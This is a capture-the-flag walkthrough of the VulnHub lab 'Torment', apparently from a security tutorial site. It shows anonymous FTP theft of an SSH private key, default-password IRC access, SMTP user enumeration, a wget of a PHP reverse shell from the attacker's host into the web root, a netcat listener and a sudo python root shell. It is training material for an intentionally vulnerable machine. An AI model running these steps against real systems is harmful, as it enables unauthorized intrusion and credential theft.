<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">digitalworld.local:Torment Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/digitalworld-localtorment-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-08-05T15:16:04+00:00">August 5, 2019</time><time class="updated" datetime="2025-06-10T20:11:23+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this Article, we are going to take a new challenge Torment, which is a lab of the series digitalworld. The credit for making this VM machine goes to “Donavan” and it’s another boot2root challenge where we have to root the server and capture the flag to complete the challenge. You can download this VM <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/digitalworldlocal-torment,299/">here</a></strong>.</span></p>
<p><span style="color: #000000;"><strong>Security Level</strong>: Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
<ol>
<li><span style="color: #000000;"><strong>Scanning</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">NMAP</span></li>
</ul>
<ol start="2">
<li><span style="color: #000000;"><strong>Enumeration</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">FTP</span></li>
<li><span style="color: #000000;">HexChat</span></li>
<li><span style="color: #000000;">ssh</span></li>
</ul>
<ol start="3">
<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Metasploit</span></li>
<li><span style="color: #000000;">Netcat</span></li>
</ul>
<ol start="4">
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Exploiting Sudo rights</span></li>
</ul>
<h3><span style="color: #000000;">Walkthrough:</span></h3>
<h3><span style="color: #800000;"><strong>Scanning:</strong></span></h3>
<p><span style="color: #000000;">Let’s start off by scanning the network and identifying the host IP address. We can identify our host IP as 192.168.1.105 by using Netdiscover.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pGRPWlWbFNM/XUhEm7yETSI/AAAAAAAAf2I/GWMTa3BSfDsUPiGBNiF7QfvW4DzevvK8wCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Then, as usual, we used our favourite tool Nmap for port enumeration. We found that there are so many ports open on the target machine.</span></p>
<p><span style="color: #000000;">We have ports like 21, 22 open.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IJYlTqCuUOs/XUhEpmiHTII/AAAAAAAAf2s/3pGXOYd6DQAamtH25_qOlf-rlwRK2hVRACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Other important ports open on the system are 25, 80, 445, 631, 2049 and 6667.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wcLJ42nSQFs/XUhEtAGtHwI/AAAAAAAAf3Y/xj5Z-qM3ylUpVugm4Fej4xrCjGsdKRIjwCLcBGAs/s1600/3.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Enumeration</span>:</strong></span></h3>
<p><span style="color: #000000;">As we can see port 21 is open with Anonymous login enabled. So we logged into the system and found there are multiple directories but <strong>ngircd </strong>and .<strong>ssh </strong>caught our attention.</span></p>
<p><span style="color: #000000;"><strong>ngircd</strong> is a free, portable and lightweight Internet Relay Chat server for small or private networks. <strong>.ssh </strong>is a directory which holds the id_rsa_keys for SSH authentication.</span></p>
<pre class="lang:default decode:true">ftp 192.168.1.105
ls -la</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CN14Qj3Sjrg/XUhEtyixlFI/AAAAAAAAf3g/fJxZ_ztXEx800wtCx_bdA9XJaolQITppQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We looked inside the <strong>.ngircd </strong>directory and there was a file named <strong>channels, </strong>we downloaded the file into our kali system.</span></p>
<p><span style="color: #000000;">Likewise, we downloaded <strong>id_rsa </strong>file from the <strong>.ssh </strong>directory.</span></p>
<pre class="lang:default decode:true">cd .ngircd
ls
get channels
cd .ssh
get id_rsa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oKFxe2vOK_Y/XUhEuXOu-eI/AAAAAAAAf3k/q6Yc1Z4m0osE7oqRqgGGaHsV2ODSHX6JgCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We looked inside the channels directory and found two channels named <strong>games </strong>&amp; <strong>tormentedprinter.</strong></span></p>
<p><span style="color: #000000;">We also looked inside the <strong>id_rsa </strong>file and got a private key which could be used for SSH login into the target system.</span></p>
<pre class="lang:default decode:true">cat channels
cat id_rsa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pkBWukGjq2A/XUhEurj5z5I/AAAAAAAAf3o/s2P9gZSjyzgF3rofL-NgU97YqDM7pB37ACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">As already explained above that there is<strong> ngircd </strong>chat service running. We tried to access the target system using HexChat.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p4u0A4eVgfY/XUhEuuOofdI/AAAAAAAAf3s/JE0RKRAcwmgvM4Aw8F9wYE7owDtYFVQ2gCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">We entered the target host IP address but we don’t have the password to login.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QSFwPHpSh-I/XUhEvOGYTcI/AAAAAAAAf3w/MSvn3Vgr1_YnnivA7HdG3O9ScfMZoOx5wCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">So what we did is we installed the <strong>ngircd </strong>on our kali system only to look for the default password of ngircd chat service.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OC5heyBHebc/XUhEm-hlomI/AAAAAAAAf2E/3bklNy7RViQ-c6um5Q2lLksUvvjtNvgtgCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">In the /etc/ngircd file we looked for the default credentials.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ijjPLutYzRU/XUhEmzs0FoI/AAAAAAAAf2M/9oFct3OevBUvLWVzE3TmIyfUekw5Z0WegCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">We got a password <strong>wealllikedebian.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ppmgYl2NNy4/XUhEnuMlACI/AAAAAAAAf2Q/KJwSXvF-Zzsbwh6IYvGF12KScMqIV_oAgCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">We used the default password in our HexChat messenger to connect to the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IEefIvTI1kU/XUhEn_8nM4I/AAAAAAAAf2Y/YYLN4P-a55UINRta_Syscypt5WRtER5bwCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">After connecting, it asked to join the channel and if you remember we have already two-channel names <strong>games </strong>&amp; <strong>tormentedprinter </strong>with us. We used both and the later had some important information for us.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jMSXxyTN3nc/XUhEn7L4qSI/AAAAAAAAf2U/uck9PFZRqk4DKkzTXQ_Z7rwzgyHv51oGQCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">After logging in we found a password <strong>mostmachineshaveasupersecurekeyandalongpassphrasell </strong>which we may be used later.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lgb16NbJDRY/XUhEoaxg7gI/AAAAAAAAf2c/q7WlPVJRj9w6KFzyPdbnLLH-RqUmWwKKACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">There is a CUPS 2.2.1 service running on port 661 and can be access through http-method as shown by the nmap scan.</span></p>
<p><span style="color: #000000;">We tried to access the same port in the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OBw8DN3yylA/XUhEoxPxtdI/AAAAAAAAf2g/GP1aTQEHAOgTIyKsc9EHkErHoiHxuusKgCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Looking here and there in search of some info. In <strong>printers </strong>tab, we got some names which we though can be used to form a username list.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vN2OPtHwJ3c/XUhEpDvyrrI/AAAAAAAAf2k/LjYNZvB7Sps77VcKeKc59T1oPwCkks3GgCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">We created a <strong>users</strong> file in which we copied all the names found above.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ams5TarVuc0/XUhEpEXO4NI/AAAAAAAAf2o/gHOyTfk1i8o-Vm3OALM_gy-hMI4HZuwGgCLcBGAs/s1600/19.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation:</strong></span></h3>
<p><span style="color: #000000;">From the nmap scan, you might have observed that there is Postfix SMTP service running on port 25. We looked for its exploit and its vulnerable to use bruteforcing.</span></p>
<p><span style="color: #000000;">We passed in the above-created <strong>users </strong>file for brute-forcing and found two legitimate users <strong>Patrick, Qiu.</strong></span></p>
<pre class="lang:default decode:true">use auxiliary/scanner/smtp/smtp_enum
set rhosts 192.168.1.105
set user_file /root/users
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AlnivfhjsSE/XUhEqJK43cI/AAAAAAAAf2w/9PASvZ83cwEtlyNM6-h6KHh0LcOiMiFfgCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">So we have a username and a private ssh key which we can use to log in to the target system.</span></p>
<p><span style="color: #000000;">We logged into the system with user <strong>Patrick </strong>and checked for the sudoer’s list but didn’t find any such binary which can lead us to privilege escalation.</span></p>
<pre class="lang:default decode:true">chmod 600 id_rsa
ssh -i id_rsa patrick@192.168.1.105
sudo -l</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FJkElZueBoM/XUhEqSPScfI/AAAAAAAAf20/NmuuzZgk59cUMQmxKmW0F-uoD7MO7zJMwCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">So to further enumerate we thought of using <strong>LinEnum.sh, </strong>so we downloaded the LinEnum.sh on the target machine using wget command.</span></p>
<p><span style="color: #000000;">But unfortunately couldn’t find anything useful.</span></p>
<pre class="lang:default decode:true">cd /tmp
wget http://192.168.1.106:8000/LinEnum.sh
chmod 777 LinEnum.sh
./LinEnum.sh</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-idtoCfUWAWo/XUhEqTiZ_2I/AAAAAAAAf24/jCyfPV6H2P0TFbsqtd5sZtPEJYcNxVlgACLcBGAs/s1600/22.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation:</strong></span></h3>
<p><span style="color: #000000;">So after a lot of enumeration and scratching here and there we found that the <strong>apache2.conf </strong>of the apache service has read write and execute permissions for all the users.</span></p>
<p><span style="color: #000000;">So what we did is we tried to edit the same file.</span></p>
<pre class="lang:default decode:true">ls -la /etc/apache2/apache2.conf
nano /etc/apache2/apache2.conf</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sr8qIUas-tg/XUhEq1JZ8_I/AAAAAAAAf28/T-93EUBRFPcfw3ic_KFasTILQOTb1RkTQCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">We added a user <strong>qiu </strong>and group <strong>qiu </strong>inside the /etc/apache2/apache2.conf so that we will leverage it for privilege escalation. So the idea is when we restart the apache service it will get executed with <strong>qiu </strong>user privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XdSayny79Dk/XUhErgnnVgI/AAAAAAAAf3A/1cx4y1sJ9QAnC_tyjSMqbNNh5kmgvYi0gCLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;">Parallelly we grabbed a php-reverse-shell from /usr/share/webshells/php and modified the listener IP as ours and named it as <strong>shell.php</strong>.</span></p>
<pre class="lang:default decode:true ">cd /usr/share/webshells/php
ls -la
cp php-reverse-shell.php /root/shell.php
nano shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p9NpIysRNNs/XUhEsHLhehI/AAAAAAAAf3E/ZRJa_jil0kA7v5QcfXQ8VcMCXH99objeACLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">We edited the listener’s IP as ours.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yCLnBcpTnjA/XUhEsSaR2hI/AAAAAAAAf3M/lKf2dMp-RkwmYH8AGKL5aZKhNagKzJ1vACLcBGAs/s1600/26.png"/></span></p>
<p><span style="color: #000000;">Then downloaded the shell into <strong>/var/www/html </strong>folder so that we can access it through browser.</span></p>
<p><span style="color: #000000;">To make the apache service run as <strong>qiu </strong>user we have to restart the apache service but we don’t have the privileges to do so, but at the same time, we can reboot the target system as <strong>reboot </strong>command can be executed as<strong> sudoer </strong>for the user Patrick<strong>.</strong></span></p>
<pre class="lang:default decode:true">cd /var/www/html
wget http://192.168.1.106:8000/shell.php
sudo /bin/systemctl reboot</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--3qivb7tJh8/XUhEsGav6pI/AAAAAAAAf3I/ZxjYFth4DhEoUgzNpwPidU9ygIdpfirewCLcBGAs/s1600/27.png"/></span></p>
<p><span style="color: #000000;">After reboot is complete we just executed the <strong>shell.php </strong>script in the browser and at the same time started a netcat listener on our kali.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Jh0FdUlBJWA/XUhEsyg6OQI/AAAAAAAAf3Q/pk3bEDiLQEQeq6t7rGGaLSqsVuKH4iGuwCLcBGAs/s1600/28.png"/></span></p>
<p><span style="color: #000000;">After some time we got a reverse netcat shell on our kali system of user <strong>qiu.</strong></span></p>
<p><span style="color: #000000;">To elevate to the root shell we checked for the sudoer list and found that <strong>python </strong>can be run with root privileges without any password. So after executing the python one liner /bin/bash script with sudo permissions we successfully got the <strong>root shell.</strong></span></p>
<pre class="lang:default decode:true">nc -lvp 1234
python -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
sudo python -c 'import pty;pty.spawn("/bin/bash")'
id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fd_3eIIQ1V4/XUhEs_R9puI/AAAAAAAAf3U/d_JGjVl6fvgBdXdhRf5H8toqUgEdIBQbwCLcBGAs/s1600/29.png"/></span></p>
<p><span style="color: #000000;">Once you have got the root shell get the root flag is like a cakewalk which we eventually did and got the two flags <strong>proof.txt </strong>and <strong>author-secret.txt.</strong></span></p>
<pre class="lang:default decode:true">ls
cat proof.txt
cat author-secret.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FTWWGB8j-jU/XUhEtftXWlI/AAAAAAAAf3c/qgcEApAX9IEtSI2LaTXAbvO49MmzT6AHgCLcBGAs/s1600/30.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
